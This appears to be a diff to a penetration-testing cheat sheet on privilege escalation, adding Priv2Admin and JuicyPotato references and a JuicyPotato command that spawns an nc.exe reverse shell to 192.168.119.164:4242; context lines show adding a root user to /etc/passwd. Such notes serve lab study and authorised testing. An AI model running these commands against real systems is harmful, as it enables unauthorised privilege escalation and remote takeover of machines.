@@ -1219,6 +1219,8 @@ msfvenom : generate reverse shell #todo
 
 ### Manual enumeration
 
+{% embed url="https://github.com/gtworek/Priv2Admin" %}
+
 windows
 
 ```
@@ -1284,6 +1286,22 @@ AK24fcSx2Il3I
 
 student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
+
+### JuicyPotato
+
+when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges
+
+* [https://github.com/ivanitlearning/Juicy-Potato-x86](https://github.com/ivanitlearning/Juicy-Potato-x86)&#x20;
+* [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)&#x20;
+* [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)&#x20;
+
+Upload JuicyPotato.exe and nc.exe
+
+{% code overflow="wrap" %}
+```shell
+JuicyPotato.exe -l 1337 -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} -p c:\windows\system32\cmd.exe -a "/c C:.....\nc.exe -e cmd.exe 192.168.119.164 4242"
+```
+{% endcode %}
 
 ### User Account Control (UAC)
 
